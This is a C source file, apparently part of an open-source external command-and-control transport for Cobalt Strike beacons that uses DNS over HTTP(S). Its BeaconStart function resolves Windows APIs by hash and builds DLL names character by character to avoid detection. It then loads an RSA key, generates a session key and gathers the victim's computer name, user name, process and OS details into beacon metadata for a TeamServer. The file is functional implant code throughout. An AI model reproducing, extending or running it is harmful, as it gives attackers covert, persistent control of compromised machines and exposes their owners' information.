/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconStart
 *
 * Purpose:
 *
 * Implements the initial connection back
 * to the TeamServer. Then starts the IO
 * loop.
 *
 * The I-TLV configuration header must be
 * passed in as a parameter.
 *
-*/
DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
{
	BEACON_INSTANCE Ins           = { 0 };
	UCHAR           Str[MAX_PATH] = { 0 };
	PVOID           K32           =   0;
	PVOID           Ntl           =   0;
	PVOID           Ptr           =   0;

	K32 = PebGetModule( H_KERNEL32 );
	Ntl = PebGetModule( H_NTDLL );

	if ( K32 != NULL && Ntl != NULL ) 
	{
		Ins.api.wcslen              = PeGetFuncEat( Ntl, H_WCSLEN );
		Ins.api.GetACP              = PeGetFuncEat( K32, H_GETACP );
		Ins.api.wcsrchr             = PeGetFuncEat( Ntl, H_WCSRCHR );
		Ins.api.wcstombs            = PeGetFuncEat( Ntl, H_WCSTOMBS );
		Ins.api.GetOEMCP            = PeGetFuncEat( K32, H_GETOEMCP );
		Ins.api.LocalLock           = PeGetFuncEat( K32, H_LOCALLOCK );
		Ins.api.LocalFree           = PeGetFuncEat( K32, H_LOCALFREE );
		Ins.api.LocalSize           = PeGetFuncEat( K32, H_LOCALSIZE );
		Ins.api.LocalAlloc          = PeGetFuncEat( K32, H_LOCALALLOC );
		Ins.api.CloseHandle         = PeGetFuncEat( K32, H_CLOSEHANDLE );
		Ins.api.FreeLibrary         = PeGetFuncEat( K32, H_FREELIBRARY );
		Ins.api.LocalUnlock         = PeGetFuncEat( K32, H_LOCALUNLOCK );
		Ins.api.RtlRandomEx         = PeGetFuncEat( Ntl, H_RTLRANDOMEX );
		Ins.api.LocalReAlloc        = PeGetFuncEat( K32, H_LOCALREALLOC );
		Ins.api.LoadLibraryA        = PeGetFuncEat( K32, H_LOADLIBRARYA );
		Ins.api.GetTickCount        = PeGetFuncEat( K32, H_GETTICKCOUNT );
		Ins.api.GetComputerNameA    = PeGetFuncEat( K32, H_GETCOMPUTERNAMEA );
		Ins.api.GetCurrentProcessId = PeGetFuncEat( K32, H_GETCURRENTPROCESSID );

		Str[0x0] = 'c';
		Str[0x1] = 'r';
		Str[0x2] = 'y';
		Str[0x3] = 'p';
		Str[0x4] = 't';
		Str[0x5] = '3';
		Str[0x6] = '2';
		Str[0x7] = '.';
		Str[0x8] = 'd';
		Str[0x9] = 'l';
		Str[0xa] = 'l';
		Str[0xb] = 0x0;

		Ins.Module[0] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.CryptDecodeObjectEx      = PeGetFuncEat( Ins.Module[0], H_CRYPTDECODEOBJECTEX );
		Ins.api.CryptImportPublicKeyInfo = PeGetFuncEat( Ins.Module[0], H_CRYPTIMPORTPUBLICKEYINFO );

		Str[0x0] = 'a';
		Str[0x1] = 'd';
		Str[0x2] = 'v';
		Str[0x3] = 'a';
		Str[0x4] = 'p';
		Str[0x5] = 'i';
		Str[0x6] = '3';
		Str[0x7] = '2';
		Str[0x8] = '.';
		Str[0x9] = 'd';
		Str[0xa] = 'l';
		Str[0xb] = 'l';
		Str[0xc] = 0x0;

		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
		Ins.api.CryptHashData        = PeGetFuncEat( Ins.Module[1], H_CRYPTHASHDATA );
		Ins.api.CryptGenRandom       = PeGetFuncEat( Ins.Module[1], H_CRYPTGENRANDOM );
		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
		Ins.api.OpenThreadToken      = PeGetFuncEat( Ins.Module[1], H_OPENTHREADTOKEN );
		Ins.api.OpenProcessToken     = PeGetFuncEat( Ins.Module[1], H_OPENPROCESSTOKEN );
		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
		Ins.api.CryptGetHashParam    = PeGetFuncEat( Ins.Module[1], H_CRYPTGETHASHPARAM );
		Ins.api.LookupAccountSidA    = PeGetFuncEat( Ins.Module[1], H_LOOKUPACCOUNTSIDA );
		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
		Ins.api.GetTokenInformation  = PeGetFuncEat( Ins.Module[1], H_GETTOKENINFORMATION );
		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );

		Str[0x0] = 'd';
		Str[0x1] = 'n';
		Str[0x2] = 's';
		Str[0x3] = 'a';
		Str[0x4] = 'p';
		Str[0x5] = 'i';
		Str[0x6] = '.';
		Str[0x7] = 'd';
		Str[0x8] = 'l';
		Str[0x9] = 'l';
		Str[0xa] = 0x0;

		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.DnsWriteQuestionToBuffer_UTF8     = PeGetFuncEat( Ins.Module[2], H_DNSWRITEQUESTIONTOBUFFER_UTF8 );
		Ins.api.DnsExtractRecordsFromMessage_UTF8 = PeGetFuncEat( Ins.Module[2], H_DNSEXTRACTRECORDSFROMMESSAGE_UTF8 );

		Str[0x0] = 'w';
		Str[0x1] = 'i';
		Str[0x2] = 'n';
		Str[0x3] = 'i';
		Str[0x4] = 'n';
		Str[0x5] = 'e';
		Str[0x6] = 't';
		Str[0x7] = '.';
		Str[0x8] = 'd';
		Str[0x9] = 'l';
		Str[0xa] = 'l';
		Str[0xb] = 0x0;

		Ins.Module[3] = Ins.api.LoadLibraryA( CPTR( Str ) );

		if ( Ins.api.CryptDecodeObjectEx( 
				X509_ASN_ENCODING, 
				X509_PUBLIC_KEY_INFO, 
				Key,
				Len,
				CRYPT_DECODE_ALLOC_FLAG,
				NULL,
				&Ins.key[0].Ptr,
				&Ins.key[0].Len
				))
		{
			if ( CryptRsaInit( &Ins ) )
			{
				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Str ) )
				{
					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
					{
						PBEACON_METADATA_HDR Met = 0;
						PVOID                Cmp = 0;
						PVOID                Usr = 0;
						PVOID                Exe = 0;

						if ((Cmp = BeaconComputer( &Ins )))
						{
							if ((Usr = BeaconUsername( &Ins )))
							{
								if ((Exe = BeaconProcess( &Ins )))
								{
									Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
									Met = BufferAddRaw( &Ins, Met, Str, 16 );
									Met = BufferAddUI1( &Ins, Met, Ins.api.GetACP() );
									Met = BufferAddUI1( &Ins, Met, Ins.api.GetOEMCP() );
									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.BeaconId ) );
									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.api.GetCurrentProcessId() ) );
									Met = BufferAddUI2( &Ins, Met, 0 );
									Met = BufferAddUI1( &Ins, Met, 2 | 4 );
									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
									Met = BufferAddUI2( &Ins, Met, HTONS( NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber ) );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddUI4( &Ins, Met, 0x0 );
									Met = BufferAddRaw( &Ins, Met, Cmp, strlen( Cmp ) );
									Met = BufferAddUI1( &Ins, Met, '\t' );
									Met = BufferAddRaw( &Ins, Met, Usr, strlen( Usr ) );
									Met = BufferAddUI1( &Ins, Met, '\t' );
									Met = BufferAddRaw( &Ins, Met, Exe, strlen( Exe ) );

									Ins.api.LocalFree( Exe );
									Ins.api.LocalFree( Met );
								};
								Ins.api.LocalFree( Usr );
							};
							Ins.api.LocalFree( Cmp );
						};
					};
				};
				CryptRsaFree( &Ins );
			};
			Ins.api.LocalFree( Ins.key[0].Ptr );
		};

		if ( Ins.Module[3] != NULL )
			Ins.api.FreeLibrary( Ins.Module[3] );

		if ( Ins.Module[2] != NULL )
			Ins.api.FreeLibrary( Ins.Module[2] );

		if ( Ins.Module[1] != NULL )
			Ins.api.FreeLibrary( Ins.Module[1] );

		if ( Ins.Module[0] != NULL )
			Ins.api.FreeLibrary( Ins.Module[0] );
	};

	__builtin_memset( &Ins, 0, sizeof( Ins ) );

	return;
};
